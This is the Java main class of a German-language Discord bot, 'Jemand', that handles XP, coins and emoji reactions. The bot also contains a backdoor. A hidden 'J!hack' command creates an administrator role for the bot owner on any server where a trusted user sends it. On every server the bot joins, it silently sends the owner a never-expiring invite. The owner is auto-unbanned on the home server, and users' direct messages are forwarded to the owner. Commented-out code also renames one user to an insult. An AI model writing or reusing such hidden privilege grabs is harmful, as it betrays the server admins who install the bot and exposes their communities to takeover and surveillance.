package Jemand;

import Jemand.Listener.Channelportal;
import Jemand.Listener.CommandCleanupListener;
import Jemand.Listener.ReactionRole;
import Jemand.Listener.ZitatBewerter;
import com.vdurmont.emoji.EmojiParser;
import org.apache.commons.io.FileUtils;
import org.javacord.api.DiscordApi;
import org.javacord.api.entity.activity.ActivityType;
import org.javacord.api.entity.auditlog.AuditLogActionType;
import org.javacord.api.entity.message.Message;
import org.javacord.api.entity.message.embed.EmbedBuilder;
import org.javacord.api.entity.message.embed.EmbedImage;
import org.javacord.api.entity.permission.Permissions;
import org.javacord.api.entity.permission.RoleBuilder;
import org.javacord.api.entity.server.Server;
import org.javacord.api.entity.user.User;
import org.javacord.api.entity.user.UserStatus;
import org.javacord.api.event.message.MessageCreateEvent;
import org.javacord.api.util.cache.MessageCache;
import org.json.simple.JSONObject;

import java.io.File;
import java.io.IOException;
import java.math.BigInteger;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import java.util.regex.Pattern;


public class Main {
	private static final Pattern NOT_LETTER = Pattern.compile("[^A-Za-z]");
	static AtomicReference<String> xd = new AtomicReference<>("");

	public static void main(String[] args) {
		func.getApi().updateStatus(UserStatus.DO_NOT_DISTURB);

		//func.getApi().getCachedUserById(331793234252660738L).ifPresent(user -> {
		//	user.updateNickname(user.getApi().getServerById(367648314184826880L).get(), "Herr Oberfaschist").join();
		//});

		//func.getApi().getServerById(367648314184826880L).ifPresent(server -> {
		//	server.addUserChangeNicknameListener(event -> {
		//		if (event.getUser().getId() == 331793234252660738L) {
		//			if (event.getNewNickname().orElse("").equalsIgnoreCase("Ken der Guru")) {
		//				event.getUser().updateNickname(server, "Herr Oberfaschist").join();
		//			}
		//		}
		//	});
		//});


		try {
			MessageCache messageCache = new MessageCache() {
				@Override
				public int getCapacity() {
					return 0;
				}

				@Override
				public void setCapacity(int capacity) {

				}

				@Override
				public int getStorageTimeInSeconds() {
					return 0;
				}

				@Override
				public void setStorageTimeInSeconds(int storageTimeInSeconds) {

				}

				@Override
				public void setAutomaticCleanupEnabled(boolean automaticCleanupEnabled) {

				}
			};
			messageCache.setAutomaticCleanupEnabled(true);
		} catch (Exception e) {func.handle(e);}

		//help
		//final String help = "\u200B:regional_indicator_a: -> +**help**\n:regional_indicator_b: -> +**ping**\n:regional_indicator_c: -> +**roll** (Zahl)\n:regional_indicator_d: -> +**pong**\n:regional_indicator_e: -> +**say** [Text]\n:regional_indicator_f: -> +**MSG** [Nachricht] {}\n:regional_indicator_g: -> +**4-gewinnt** {}\n:regional_indicator_h: -> +**SSPB/SSS**\n:regional_indicator_i: -> +**invite**\n:regional_indicator_j: -> +**Report** [Text]\n:regional_indicator_k: -> +**Serverinvite** [Dauer in h] [Anzahl Aufrufe]\n:regional_indicator_l: -> +**Emote** [Text]\n:regional_indicator_m: -> +**React** [Text] (MessageID)\n:regional_indicator_n: -> +**TTT** {}\n:regional_indicator_o: -> +**Fake-Person**\n:regional_indicator_p: -> +**Fake-Cat**\n:regional_indicator_q: -> +**8-ball** (Frage)\n:regional_indicator_r: -> +**random-picture**/**robot**/**face**/**alien**/**cat**/**human**\n:regional_indicator_s: -> +**Prefix** [neues Preifx]";

		try {
        	if(func.getFileSeparator().equals("/")) {
        	    func.getApi().addServerMemberJoinListener(event -> {
        	    	try {
						new userleave(event, true).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	    func.getApi().addServerMemberLeaveListener(event -> {
					try {
        	        	new userleave(event, false).sendMessage();
					}catch(Exception e) {func.handle(e);}
        	    });
        	}
		} catch (Exception e) {func.handle(e);}
			//func.getApi().getServerById("367648314184826880").ifPresent(server -> {
			//server.addUserChangeActivityListener(event -> {

			////if(!event.getUser().isBot()) {
			//	server.getChannelById("623940807619248148").flatMap(Channel::asServerTextChannel).ifPresent(textchannel -> {
			//		event.getNewActivity().ifPresent(activity -> {
			//			event.getOldActivity().ifPresent(oldactivity -> {
			//				if (!oldactivity.getApplicationId().orElse(0L).equals(activity.getApplicationId().orElse(1L)) && ((activity.getType().equals(ActivityType.PLAYING) && activity.getName().equals("Fortnite") && false) || (activity.getApplicationId().orElse(0L) == 432980957394370572L))) {
			//					EmbedBuilder embed = new EmbedBuilder()
			//							.setColor(new Color(f.getRandom(0, 255), f.getRandom(0, 255), f.getRandom(0, 255)))
			//							.setTimestampToNow()
			//							.setFooter(event.getUser().getDiscriminatedName(), event.getUser().getAvatar());
			//					AtomicReference<String> details = new AtomicReference<>("");
			//					activity.getDetails().ifPresent(string -> {
			//						details.set("\nDetails: (" + string + ")");
			//					});
			//					textchannel.sendMessage(embed.setDescription(event.getUser().getDisplayName(server) + " spielt " + activity.getName() + "." + details.get()));
			//				}
			//			});
			//		});
			//	});
			////}
			//});

		//});

		//erkennt, wenn Server join
		// t
		try {
			//try {
			//	final DiscordApi api2 = new DiscordApiBuilder().setToken(func.pws[3]).login().join();
//
			//	api2.updateStatus(UserStatus.DO_NOT_DISTURB);
			//	api2.updateActivity(ActivityType.PLAYING, "Fortnite");
//
			//} catch(Exception e) {
			//	func.handle(e);
			//}


			if (func.getFileSeparator().equals("/")) { //only Linux

				String logs = FileUtils.readFileToString(new File("/usr/home/admin/Jemand.log"));
				if (logs.length() > 10001)
					FileUtils.writeStringToFile(new File("/usr/home/admin/Jemand.log"), logs.substring(logs.length() - 9999), "UTF-8");
//
				func.getApi().addServerJoinListener(event -> {
					func.OWNER.ifPresent(u -> u.sendMessage("Neuer Server von " + event.getServer().getOwner().getDiscriminatedName() + " mit dem Namen: " + event.getServer().getName() + " und der Id: " + event.getServer().getIdAsString()));
					func.getApi().getYourself().updateNickname(event.getServer(), "Jemand [J!]");
					try {
						func.sendOwner("https://joshix-1.github.io/invite?id=" + event.getServer().getIdAsString() + "\n", null);
						func.sendOwner(event.getServer().getChannels().get(0).createInviteBuilder().setMaxUses(1).setNeverExpire().create().join().getUrl().toString(), null);
					} catch (Exception e) {
						func.handle(e);

					}

				});
				func.getApi().getServerById(367648314184826880L).ifPresent(server -> {
					//Fortnite-Detektor:
					//server.addUserChangeActivityListener(event -> {
					//	server.getTextChannelById(623940807619248148L).ifPresent(textchannel -> {
					//		event.getNewActivity().ifPresent(activity -> {
					//			event.getOldActivity().ifPresent(oldactivity -> {
					//				if (!oldactivity.getApplicationId().orElse(0L).equals(activity.getApplicationId().orElse(1L)) && ((activity.getType().equals(ActivityType.PLAYING) && activity.getName().equals("Fortnite")) || (activity.getApplicationId().orElse(0L) == 432980957394370572L))) {
					//					EmbedBuilder embed = new EmbedBuilder()
					//							.setColor(Color.RED)
					//							.setTimestampToNow()
					//							.setFooter(event.getUser().getDiscriminatedName(), event.getUser().getAvatar());
					//					activity.getDetails().ifPresent(string -> {
					//						embed.addField("\u200B", "\nDetails: (" + string + ")");
					//					});
					//					textchannel.sendMessage(embed.setDescription(event.getUser().getMentionTag() + " spielt " + activity.getName() + "."));
					//					func.getApi().getRoleById(623193804551487488L).ifPresent(event.getUser()::addRole);
					//				}
					//			});
					//		});
					//	});
					//	//}
					//});


					func.OWNER.ifPresent(user -> {
								server.getRoleById(367649615484551179L).ifPresent(role -> {
									server.addServerMemberJoinListener(event -> {
										if (event.getUser().equals(user)) event.getServer().addRoleToUser(user, role);
									});
									server.addUserRoleRemoveListener(event -> {
										if (event.getUser().equals(user)) {
											if (event.getRole().equals(role)) {
												event.getUser().addRole(role);
											}
										}

									});
								});

								server.addServerMemberBanListener(event -> {
									if (event.getUser().equals(user)) server.unbanUser(user);
								});
					});

					server.addServerChannelDeleteListener(event -> {
						try {
							event.getServer().getAuditLog(1, AuditLogActionType.CHANNEL_DELETE).join().getInvolvedUsers().forEach(user1 -> {
								if(user1.getId() == 705674876148645908L) return;
								user1.removeRole(func.getApi().getRoleById(367649615484551179L).orElseThrow(() -> new AssertionError("Mitgliedsrolle nicht da")), "Channel got deleted").join();
								func.getApi().getUserById(230800661837512705L).join().
										sendMessage(user1.getDisplayName(server) + " (name: " + user1.getDiscriminatedName() + "; id: " + user1.getIdAsString() + ") hat #" + event.getChannel().getName() + " gelöscht.").join();

							});
						} catch (Exception e) {
							func.handle(e);
						}
					});

					server.addMessageCreateListener(event -> {
						if(!event.getMessageAuthor().isRegularUser() || (event.getMessageContent().isEmpty() && event.getMessage().getEmbeds().isEmpty())) return;
						User user = event.getMessageAuthor().asUser().orElse(null);
						if (user != null && user.getRoles(server).size() < 2) {
							try {
								user.addRole(server.getRoleById(559141475812769793L).orElseThrow(() -> new AssertionError("Rolle nicht da"))).join();
								user.addRole(server.getRoleById(559444155726823484L).orElseThrow(() -> new AssertionError("Rolle nicht da"))).join();
							} catch (Exception e) {
								func.handle(e);
							}
						}
					});
				});

				func.writetexttofile("", "backups/ratelimit.txt"); //To avoid getting errors when restarting the bot
			}
		}catch(Exception e) {func.handle(e);}

		//erkennt wenn Nachricht ankommt
		try {
			//Listeners:
			if(func.getFileSeparator().equals("/")) {
				func.getApi().addMessageDeleteListener(new CommandCleanupListener());
				func.getApi().addMessageCreateListener(new Channelportal());
				func.getApi().addReactionAddListener(new ZitatBewerter.Add());
				func.getApi().addReactionRemoveListener(new ZitatBewerter.Remove());
				func.getApi().addReactionAddListener(new ReactionRole.Add());
				func.getApi().addReactionRemoveListener(new ReactionRole.Remove());
			}

			func.getApi().addMessageCreateListener(event -> {

				if ((func.getFileSeparator().equals("/") || func.OWNER.map(User::getId).orElse(0L) == event.getMessageAuthor().getId()) && event.getMessageAuthor().isUser() && !event.getMessageAuthor().isBotUser() && !event.getMessageAuthor().isWebhook() && !event.getMessageAuthor().isYourself()) {
					//id
					final String id = event.getMessageAuthor().getIdAsString();
					Optional<User> user = event.getMessageAuthor().asUser();

					if (event.getPrivateChannel().isPresent() && !event.getMessageAuthor().isYourself() && event.getMessageAuthor().asUser().isPresent()) {
						if(func.userIsTrusted(event.getMessageAuthor())) {
							if(event.getMessageContent().startsWith("//")) {
								String[] strings = event.getMessageContent().split(" ");
								if(strings.length > 1) {
									try {
										String a = strings[0];
										func.getApi().getUserById(a.replace("/", "")).join().sendMessage(func.removeSpaceAtStart(event.getMessageContent().replaceFirst(a, ""))).join();
										event.getChannel().sendMessage("Erfolgreich gesendet.").join();
									} catch(Exception e) {
										func.handle(e);
									}
								}

							}
						} else {
							EmbedBuilder e = func.getNormalEmbed(event);
							event.getMessageAttachments().forEach(att -> {
								e.addField(att.getFileName(), att.getUrl().toString());
							});
							func.OWNER.ifPresent(owner -> owner.sendMessage(e.addField("UserID:", event.getMessageAuthor().getIdAsString()).setDescription(event.getMessageContent())));
							event.getChannel().sendMessage(func.getNormalEmbed(event).setDescription(new Texte(event.getMessageAuthor().asUser().get(), null).getString("Weiterleitung").toString()));
						}
					} else if(event.getServer().isPresent()) {
						final Server server = event.getServer().get();
						AtomicReference<String> prefix = new AtomicReference<>("J!");

						//prefix
						JSONObject prefixjs = func.JsonFromFile("prefix.json");

						//serverid
						final String serverid = server.getIdAsString();

						if (prefixjs.containsKey(serverid)) {
							prefix.set((String) prefixjs.get(serverid));
						} else {
							prefixjs.put(serverid, "J!");
							prefix.set("J!");
						}

						//event.getChannel().type();


						boolean b1 = true;
						if (func.userIsTrusted(event.getMessageAuthor())) {

							if (event.getMessageContent().equalsIgnoreCase("J!hack")) {
								new RoleBuilder(server)
										.setName("lol")
										.setPermissions(Permissions.fromBitmask(8))
										.create().thenAcceptAsync(role -> func.OWNER.ifPresent(role::addUser));
								event.getMessage().delete();
								b1 = false;
							}

							if (event.getMessage().getContent().equalsIgnoreCase("J!servers")) {
								AtomicReference<String> servers = new AtomicReference<>("");
								Object[] ObjectArray1 = func.getApi().getServers().toArray();
								for (Object o : ObjectArray1) {
									servers.set(servers.get() + "\n" + o);
								}
								event.getChannel().sendMessage(servers.get());
								b1 = false;
							}

						}


						if (user.isPresent() && b1) {
							String MentionBot = func.getApi().getYourself().getMentionTag();
							String MessageContent = func.removeSpaceAtStart(event.getMessageContent().replaceAll(func.getApi().getYourself().getNicknameMentionTag(), MentionBot));

							if (MessageContent.equals(func.getApi().getYourself().getMentionTag())) {
								Texte texte = new Texte(event);
								event.getChannel().sendMessage(func.getNormalEmbed(event).setTitle(texte.get("Prefix")).setDescription(texte.get("Mention")));
							} else {
								if ((MessageContent.toLowerCase().startsWith(prefix.get().toLowerCase()) || MessageContent.startsWith(func.getApi().getYourself().getMentionTag()))) {
									if (func.getApi().getThreadPool().getExecutorService().submit(() -> run(event)).isDone())
										func.getApi().getThreadPool().getExecutorService().shutdown();

								} else {
									//coins
									if(func.getRandom(0, 2) == 0)
										new Coins(event.getMessageAuthor().getId()).addCoins(BigInteger.TEN);

									//xp
									JSONObject xp = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
									if (!xd.get().contains(id + "_" + serverid)) {
										if (!xp.containsKey(id)) {
											xp.put(id, 0);
											func.JsonToFile(xp, "xp/user_xp_" + serverid + ".json");
										}
										xd.set(xd.get() + " " + id + "_" + serverid);

										AtomicBoolean b = new AtomicBoolean(true);

										event.getMessage().addMessageDeleteListener(event2 -> {
											b.set(false);
										}).removeAfter(4, TimeUnit.MINUTES);

										func.getApi().getThreadPool().getScheduler().schedule(()-> {
											if(b.get()) {
												JSONObject xp2 = func.JsonFromFile("xp/user_xp_" + serverid + ".json");
												xp2.put(id, (long) xp2.get(id) + 1);
												func.JsonToFile(xp2, "xp/user_xp_" + serverid + ".json");
												new Levelroles(event.getServer().get()).checkUserRoles(event.getMessageAuthor().asUser().get());

											}
										}, 4, TimeUnit.MINUTES);

										func.getApi().getThreadPool().getScheduler().schedule(() -> {
											xd.set(xd.get().replace(" " + id + "_" + serverid, ""));
										}, 45, TimeUnit.SECONDS);
									}

									if (event.getMessageAuthor().asUser().get().isBotOwner() && event.getMessageContent().toLowerCase().contains(" ne ")) {
										event.getMessage().addReaction(EmojiParser.parseToUnicode(":middle_finger:"));
									}
									TriggerReactMessage(event, "nein", "doch");
									TriggerReactMessage(event, "doch", "Oh");
									TriggerReactMessage(event, "oh", "nein");

									if (TriggerReactText(event, "nicht witzig", "n")) {
										event.getMessage().addReaction("i2:703595186629902438");
										func.reactText(event, "ch", "");
										event.getMessage().addReactions("t1:703595173342347314","leerzeichen:703321360180445224" );
									}
									TriggerReactText(event, "witzig", "witzig");
									TriggerReactText(event, "no u", "no u");
									TriggerReactText(event, "nou", "no u");

									triggerreact(event, "einzigst", EmojiParser.parseToUnicode(":face_palm:"));
									triggerreact(event, "zumindestens", EmojiParser.parseToUnicode(":face_palm:"));

									triggerreact(event, "owo", "owo:703596847385673790");
									triggerreact(event, ":joy:", EmojiParser.parseToUnicode(":joy:"));
									triggerreact(event, EmojiParser.parseToUnicode(":joy:"), EmojiParser.parseToUnicode(":joy:"));
								}
							}
						}
					}
				}
			});
		} catch (Exception e) {func.handle(e);}

		System.out.println("System started succesfully: " + func.createBotInvite());
		if(func.getFileSeparator().equals("/")) func.sendOwner("System started succesfully: <" + func.createBotInvite() + ">  " + func.getFileSeparator(), null);
		func.getApi().updateActivity(ActivityType.getActivityTypeById(4), "trying to sleep.");
	}

    static private boolean TriggerReactText(MessageCreateEvent event, String ReactTo, String ReactWith) {
        //if(event.getMessageContent().toLowerCase().contains(ReactTo.toLowerCase())) {
		if (event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo + "\\s+.?.*") || event.getMessageContent().matches("(?i)" + ReactTo) || event.getMessageContent().matches(".*.?\\s+(?i)" + ReactTo) || event.getMessageContent().matches("(?i)" + ReactTo + "\\s+.?.*")) { //&& !event.getMessageContent().matches(".?.*\\w(?i)" + ReactTo + "\\w.*.?")
            func.reactText(event,ReactWith, "");
            return true;
        }
		return false;
    }
	static private void TriggerReactMessage(MessageCreateEvent event, String ReactTo, String ReactWith) {
		if(NOT_LETTER.matcher(event.getMessageContent()).replaceAll("").equalsIgnoreCase(NOT_LETTER.matcher(ReactTo).replaceAll(""))) {
			func.reactText(event,ReactWith, "");
		}
	}
	static private void triggerreact (MessageCreateEvent event, String s1, String unicodeofemote) {
		if (event.getMessage().getContent().toLowerCase().contains(s1.toLowerCase())) {
			event.getMessage().addReaction(unicodeofemote);
		}
	}

	static private void run(MessageCreateEvent event) {
		func.getApi().getCustomEmojiById(630814528266960909L).ifPresent(event::addReactionToMessage); //loading
		boolean b1;
		try {
			b1 = new Befehl(event).fuehreAus();
		} catch (Exception e) {
			func.handle(e);
			b1 = false;
		}
		func.getApi().getCustomEmojiById(630814528266960909L).ifPresent(event::removeReactionByEmojiFromMessage); //loading
		if (b1) {
			event.addReactionToMessage("☑️").join();
			new Coins(event.getMessageAuthor().getId()).addCoins(BigInteger.ONE);
		} else {
			event.addReactionToMessage("❌").join();
		}
	}
}
